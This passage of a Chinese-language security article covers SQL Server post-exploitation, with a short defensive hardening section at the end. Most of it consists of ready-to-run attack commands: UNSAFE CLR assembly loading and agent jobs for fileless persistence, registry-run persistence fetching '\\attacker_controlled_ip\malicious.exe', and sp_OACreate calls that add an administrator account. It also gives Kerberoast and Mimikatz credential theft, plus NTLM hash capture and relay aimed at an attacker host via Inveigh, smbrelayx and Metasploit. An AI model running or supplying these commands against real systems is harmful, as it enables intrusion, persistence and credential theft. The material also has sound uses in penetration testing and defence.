  * SQL Server所有版本都为SQL Server服务帐户提供sysadmin特权
以下是利用点和常用工具列表：
利用点 | 常用工具  
---|---  
本地管理员身份访问DB | Management Studio，sqlcmd和其他SQL客户端工具。  
本地系统身份访问DB | Psexec，可访问性选项，带有本机SQL客户端工具的调试器。  
通过LSA Secrets恢复服务帐户密码 | Mimikatz, Metasploit, lsadump.  
SQL Server服务进程注入 | Metasploit, Python, Powershell
（LoadLibrary，CreateRemoteThread等类似的功能）  
从服务进程中窃取身份验证令牌 | Metasploit, Incognito, Invoke-TokenManipulation  
单用户模式 | DBATools  
以上利用点不一定适用所有SQL Server所有版本，下面简单列出一下适用版本（√：适用，×：不适用，?：可能适用），仅供参考：
利用点 | SQL Server 2000 | SQL Server 2005 | SQL Server 2008 | SQL Server 2012 |
SQL Server 2014 | SQL Server 2016  
---|---|---|---|---|---|---  
服务凭证 | √ | √ | √ | √ | √ | √  
本地管理员 | √ | √ | × | × | × | ×  
本地系统 | √ | √ | √ | × | × | ×  
SQL Server进程注入 | √ | √ | √ | √ | √ | ?  
令牌窃取 | √ | √ | √ | √ | √ | ?  
单用户模式 | ? | √ | √ | √ | √ | √  
附PowerUpSQL一些执行命令：
### SQL Server权限维持
利用SQL Server设置权限维持方法，主要还是靠SQL
Server代理作业，定期执行计划任务。为了实现无文件攻击，还利用CLR程序集功能，加载恶意DLL文件。通过这两种内置功能进行持久化，实现了在无文件落地、无其他进程的情况下，实施权限维持。
此持久化有几个前提条件：
  * 启动SQL Server代理服务
  * 开启CLR功能
  * 将存储.Net程序集的数据库配置为可信赖的
以上均在SQL Server代理执行计划任务和SQL Server CLR相关利用详细介绍。
#### 高隐蔽性持久化
连接SQL Server数据库后，创建SQL
Server代理作业，定时执行SQL语句调用恶意的用户自定义存储过程或函数利用SQL语句将CLR程序集以十六进制形式加载加载进数据库，实现通过用户自定义函数调用恶意的CLR程序集。已创建的SQL
Server代理作业，定期执行计划任务，调用CLR程序集，实现无文件持久化。
首先创建名为CreateWarSQLKit的存储过程（ **WarSQLKit** 相关的利用可查看第二章中SQL ServerCLR相关利用的
**WarSQLKit** 篇章）
    USE msdb;
    CREATE procedure CreateWarSQLKit as
        CREATE ASSEMBLY [WarSQLKit]
        AUTHORIZATION [dbo]
        FROM 0x4D5A......
        WITH PERMISSION_SET = UNSAFE;
    GO
创建SQL Server代理作业，定期执行CreateWarSQLKit，实现WarSQLKit的DLL文件持久化。
    USE msdb;
    EXEC dbo.sp_add_job @job_name = N'test_CreateWarSQLKit_job1'; 
    EXEC sp_add_jobstep 
        @job_name = N'test_CreateWarSQLKit_job1', 
        @step_name = N'test_CreateWarSQLKit_name1',
        @subsystem = N'TSQL',
        @command = N'exec CreateWarSQLKit', 
        @retry_attempts = 5, 
        @retry_interval = 5 ;
    EXEC dbo.sp_add_jobserver @job_name = N'test_CreateWarSQLKit_job1';
    EXEC dbo.sp_start_job N'test_CreateWarSQLKit_job1';
#### 其他方式实现持久化
除了正常利用SQL Server可以执行系统命令的存储过程，以下操作都是作为SQL对象存储在数据库中， 并且没有任何更改到磁盘，也可以做到无文件持久化。
可以为utilman.exe设置调试器，该调试器将在调用cmd.exe时运行。仅sysadmins特权。
    import-module .\PowerUPSQL.psd1 
    Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command
    'c:\windows\system32\cmd.exe' -Instance SQLServerName\InstanceName'
可以利用CurrentVersion \run与xp_regwrite建立。仅sysadmins特权。
    import-module .\PowerUPSQL.psd1 
    Get-SQLPersistentRegRun -Verbose -Name legit -Command
    '\\attacker_controlled_ip\malicious.exe' -Instance 'SQLServerName\InstanceName'
可以将所有自定义CLR程序集导出到DLL，最后导入后门CLR。仅sysadmins特权。
    import-module .\PowerUPSQL.psd1 
    $Results = Get-SQLStoredProcedureCLR -Verbose -Instance 
    'SQLServerName\InstanceName' -UserName sa -Password 'password' -ExportFolder 
    c:\temp Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.exe
如果遇到SQLServer中的xplog70.dll文件被删除或放到其他地方了， xp_cmdshell就无法执行我们发出
的命令了。可以考虑SQLServer中有一系列与OLE相关的存储过程，这一系列的存储过程同xp_cmdshell
以及读取注册表系列的存储过程一样危险，所以被删除的可能性就小一些。这系列的存储过程有
sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod，
sp_OASetProperty，sp_OAStop。 可以在系统添加一个用户名为test，密码为12345678，并加入管理员组。
    DECLARE @shell INT EXEC SP_OACREATE 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'c:\windows\system32\cmd.exe /c net user test 12345678 /add' 
    DECLARE @shell INT EXEC SP_OACREATE 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'c:\windows\system32\cmd.exe /c net localgroup administrators test /add '
xp_cmdshell、SP_OACREATE等可执行系统命令的存储过程，以及与它们相对应的动态连接库文件
（DLL）都被删除了，还可以读取和修改注册表的存储过程（xp_regread、xp_regwrite）来克隆对方系 统的管理员用户。
PowerUpSQL命令参考：
### SQL Server横向移动
#### Kerberoast攻击
利用传统的Kerberoast攻击方式进行横向移动，Kerberoast是一种针对Kerberos协议的攻击方式。根据Kerberos协议，当向活动目录完成身份验证后，密钥分发中心（KDC）会将服务授权的票据（TGT）发送给用户，作为访问资源时的身份凭证。当需要访问资源，向票据服务器（TGS）发送Kerberos票据时，首先需要使用具有有效身份用户的票据（TGT）向票据服务器（TGS）请求乡音的服务票据。当该票据（TGT）被验证具有此服务的权限是，会向用户发送一张新的票据。新的票据使用SPN关联的计算机中的服务账号的NTLM
Hash。攻击者可以尝试不同的NTLM Hash来开启Kerberos票据。NTLM Hash对应的是服务账号的密码。
实施此攻击前有几个前提条件：
  * 域内用户运行的SQL Server已经手动注册过SPN
  * Kerberos协议加密方式为RC4_HMAC_MD5
通过SQL Server能执行PowerShell命令的利用点和导入特定功能的CLR程序集即可完成Kerberoast攻击。
查看指定域内用户所注册的SPN
    setspn -L SEC\MSSQL2
通过上文设置WarSQLKit的DLL存在sp_Mimikatz存储，执行mimikatz。
    exec sp_cmdExec 'sp_Mimikatz';
    select * from WarSQLKitTemp //获取Mimikatz日志
或者利用任何一种可以执行PowerShell命令的方式，可以请求到SPN的Kerberos票据：
    Add-Type -AssemblyName System.IdentityModel 
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/MSSQL2.sec.com:1433"
    exec xp_cmdshell 'powershell Add-Type -AssemblyName System.IdentityModel ; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/MSSQL2.sec.com:1433"'
之后可以使用PowerShell命令远程下载部署[mimikatz](https://github.com/gentilkiwi/mimikatz)，或者[kerberoast](https://github.com/nidem/kerberoast)。
    #mimikatz：kerberos::list /export
导出的票据会保存到当前目录的kirbi文件。
利用[kerberoast](https://github.com/nidem/kerberoast)中的tgsrepcrack.py脚本，离线破解NTLM
Hash。
PowerUpSQL中使用Get-SQLServerPasswordHash，可自动提取SQL登录密码哈希：
    import-module .\PowerUPSQL.psd1
    Get-SQLServerPasswordHash -Verbose -Instance 'SQLServerName\InstanceName' -Migrate
#### CLR实现无文件落地横向移动
[David Cash](https://research.nccgroup.com/author/dcashncc/)在[MSSQL Lateral
Movement](https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/)介绍了SQL Server中使用CLR自动执行横向移动而无文件落地和不需要xp_cmdshell，以及如何防止被检测到。
CLR相关的介绍在上文已经介绍，在此不再赘述。通常为实现命令执行而对MSSQL服务进行后期开发通常会利用XP_CMDSHELL存储过程在MSSQL进程的上下文中运行操作系统命令。要使用此技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户或通过BCP写入磁盘的二进制文件，这提供了明显的检测机会。
SQL
Server服务进程可以执行提供给它的任何.NET代码，因此利用.NET代码进行横向移动，仅需要构建适当的DLL。作为概念的证明，为了生成了一个简单的程序集，该程序集对一些shellcode进行XOR并将其注入到生成的进程中。使用[Squeak](https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak)可以简化CLR代码的创建和调用，下面是Squeak具备的一些功能：
  * 展示连接数据
  * 从原始二进制文件和单字节XOR读取shellcode字节
  * 生成一个MSSQL CLR DLL，该DLL对shellcode进行XOR，生成一个新进程，然后将shellcode注入其中。
  * 计算DLL的SHA512哈希
  * 生成带有硬编码参数的单个.NET可执行文件，以通过SQL连接执行DLL –该可执行文件执行以下操作：
  * 创建一个SQL连接
  * 检查SQL Server版本
  * 检查DBA权限
  * 检查并记录现有的安全设置
  * 修改安全设置
  * 创建并运行程序集
  * 恢复安全设置并删除程序集
使用[Squeak](https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak)可以生成带有连接字符串和CLR程序集的独立可执行文件。CLR程序集的代码是从本地目录中的文件中加载，可以直接打开文件，也可以在工具中对其进行编辑。
#### UNC路径注入
UNC用于访问远程文件服务器，格式为\ip\file，如果我们可以执行这个功能，则可以强制SQL Server向我们进行身份验证，并且可以获得SQL
Server服务帐号的NTLM密码哈希。
**可以通过以下方式实现自动化：**
  * PowerUpSQL的Get-SQLServiceAccountPwHashes脚本
  * SQL NTLM Hash：
    import-module .\PowerUpSQL.ps1`
    Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1
    Import-Module C:\PowerUpSQL-master\Scripts\pending\Get-SQLServiceAccountPwHashes.ps1
    Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp attacker_controlled_ip
  * 使用smbrelayx（impacket）
    python smbrelayx.py -h sqlserverIP -c 'powershell empire launcher'
  * metasploit的SQL NTLM Hash：
    msf > use auxiliary/admin/mssql/mssql_ntlm_stealer
    set SMBPROXY attackerIP
    set RHOST webappwithsqliIP
    set GET_PATH pathtosqli
    run
## **防守方如何应对**
### 账号管理
**查询目前所有用户列表**
    select name,password from syslogins order by name
**为不同的管理员分配不同的账号**
按照使用目的进行分配账号，避免不同用户间共享账号，提高安全性。或在企业管理器中直接添加远程登陆用户建立角色，并给角色授权，把角色赋给不同的用户或修改用户属性中的角色和权限。
添加不同用户，参考配置操作：
    sp_addlogin 'user1','password1'
    sp_addlogin 'user2','password2'
**删除或锁定无效账号**
删除冗余的系统默认账号，减少系统安全隐患，参考配置操作。
    Microsoft SQL Server Management Studio -> SQL Server -> 安全性 -> 登录名 -> 选择要删除的用户名（右键）
**限制启动账号权限**
启动mssql的用户权限过高，会导致其子进程具有相同权限，参考配置操作：
    Microsoft SQL Server Management Studio -> SQL Server ->属性(右键) -> 安全性
新建SQL server服务账号后，建议将其从User组中删除，且不要把该账号提升为Administrators组的成员，授予以账户最少启动权限。
### 认证授权
**权限最小化**
在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限，参考配置操作：
    Microsoft SQL Server Management Studio -> SQL Server -> 属性(右键) -> 安全性
**数据库角色**
使用数据库角色（ROLE）来管理对象的权限，参考配置操作：
    Microsoft SQL Server Management Studio -> SQL Server -> 安全性 -> 服务器角色（右键）-> 新服务器角色
调整角色属性中的权限，赋予角色中拥有对象对应的SELECT、INSERT、UPDATE、DELETE、EXEC、DRI权限
**是否存在空密码用户**
对所有账户的属性进行审计，包括空密码、密码更新时间等。修改目前所有账号的口令，确认为强口令。特别是sa账号。
    select * from sysusers 
    select name,Password from syslogins where password is null order by name  # 查看口令为空的用户 
使用sp_password更新用户密码，特别是sa 账号，需要设置至少10位的强口令。
    exec sp_password 'old_passwd', 'new_passwd', sa
**锁定特权**
默认情况下，SQL Server安装会在模型数据库之外的所有数据库中授予guest帐户公共角色成员身份。
建议在Windows中禁用guest帐户，并撤消其对除master和tempdb之外的所有数据库的访问权限。参考配置操作，使用以下命令删除数据库访问权限
    use msdb;
    exec sp_revokedbaccess guest;